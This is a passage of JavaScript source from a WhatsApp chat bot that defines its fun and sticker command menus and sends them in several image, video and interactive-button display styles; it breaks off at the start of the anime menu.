│${setv} ${prefix}truth 🅕
│${setv} ${prefix}dare 🅕
│${setv} ${prefix}suit 🅕
│${setv} ${prefix}tictactoe 🅕
│${setv} ${prefix}math 🅕
│${setv} ${prefix}playbomb 🅕
│${setv} ${prefix}casino 🅕
│${setv} ${prefix}rob 🅕
│${setv} ${prefix}slot 🅕
│${setv} ${prefix}dice 🅕 
│${setv} ${prefix} profile 🅕
│${setv} ${prefix} claim 🅕
│${setv} ${prefix} tmoney 🅕
│${setv} ${prefix} tflimit 🅕
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'funmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Fun* 」❍
│${setv} ${prefix}define 🅕
│${setv} ${prefix}readmore 🅕
│${setv} ${prefix}fact 🅕
│${setv} ${prefix}couple 🅕
│${setv} ${prefix}soulmate 🅕
│${setv} ${prefix}stupidcheck 🅕
│${setv} ${prefix}handsomecheck 🅕
│${setv} ${prefix}uncleancheck 🅕
│${setv} ${prefix}hotcheck 🅕
│${setv} ${prefix}smartcheck 🅕
│${setv} ${prefix}greatcheck 🅕
│${setv} ${prefix}evilcheck 🅕
│${setv} ${prefix}dogcheck 🅕
│${setv} ${prefix}coolcheck 🅕
│${setv} ${prefix}waifucheck 🅕
│${setv} ${prefix}awesomecheck 🅕
│${setv} ${prefix}gaycheck 🅕
│${setv} ${prefix}cutecheck 🅕
│${setv} ${prefix}lesbiancheck 🅕
│${setv} ${prefix}hornycheck 🅕
│${setv} ${prefix}prettycheck 🅕
│${setv} ${prefix}lovelycheck 🅕
│${setv} ${prefix}uglycheck 🅕
│${setv} ${prefix}pick 🅕
│${setv} ${prefix}pickupline 🅕
│${setv} ${prefix}quotes 🅕
│${setv} ${prefix}can 🅕
│${setv} ${prefix}is 🅕
│${setv} ${prefix}when 🅕
│${setv} ${prefix}where 🅕
│${setv} ${prefix}what 🅕
│${setv} ${prefix}how 🅕
│${setv} ${prefix}rate 🅕
│${setv} ${prefix}cry 🅕
│${setv} ${prefix}kill 🅕
│${setv} ${prefix}hug 🅕
│${setv} ${prefix}pat 🅕
│${setv} ${prefix}lick 🅕 
│${setv} ${prefix}kiss 🅕
│${setv} ${prefix}bite 🅕
│${setv} ${prefix}yeet 🅕
│${setv} ${prefix}bully 🅕
│${setv} ${prefix}bonk 🅕
│${setv} ${prefix}wink 🅕
│${setv} ${prefix}poke 🅕
│${setv} ${prefix}nom 🅕
│${setv} ${prefix}slap 🅕
│${setv} ${prefix}smile 🅕 
│${setv} ${prefix}wave 🅕
│${setv} ${prefix}awoo 🅕
│${setv} ${prefix}blush 🅕
│${setv} ${prefix}smug 🅕
│${setv} ${prefix}glomp 🅕 
│${setv} ${prefix}happy 🅕
│${setv} ${prefix}dance 🅕
│${setv} ${prefix}cringe 🅕
│${setv} ${prefix}cuddle 🅕
│${setv} ${prefix}highfive 🅕 
│${setv} ${prefix}handhold 🅕
│${setv} ${prefix}spank 🅕
│${setv} ${prefix}tickle 🅕
│${setv} ${prefix}feed 🅕
│${setv} ${prefix}checkme 🅕
│${setv} ${prefix}sound1 - sound161 🅕
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'stickermenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Sticker* 」❍
│${setv} ${prefix}goose 🅕
│${setv} ${prefix}woof 🅕
│${setv} ${prefix}8ball 🅕
│${setv} ${prefix}lizard 🅕
│${setv} ${prefix}meow 🅕
│${setv} ${prefix}gura 🅕
│${setv} ${prefix}telestick 🅕
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'animemenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
